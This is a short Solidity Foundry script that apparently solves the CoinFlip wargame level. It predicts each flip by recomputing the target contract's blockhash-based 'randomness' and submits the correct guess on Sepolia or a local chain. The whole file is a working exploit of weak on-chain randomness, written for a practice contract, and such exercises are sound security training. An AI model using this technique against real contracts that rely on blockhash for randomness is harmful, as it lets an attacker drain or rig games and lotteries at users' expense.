// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {CoinFlip} from "src/Coinflip.sol";

contract CoinFlipAttack is Script {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public instance;
    CoinFlip target;

    function run() external returns (CoinFlip) {
        if (block.chainid == 11155111) {
            instance = vm.envAddress("COINFLIP_TARGET");
            target = CoinFlip(instance);
        } else if (block.chainid == 31337 && address(target) == address(0)) {
            target = new CoinFlip();
        }

        vm.startBroadcast(); //////////////////////////////////////////////

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
        vm.stopBroadcast(); //////////////////////////////////////////////
        return target;
    }
}
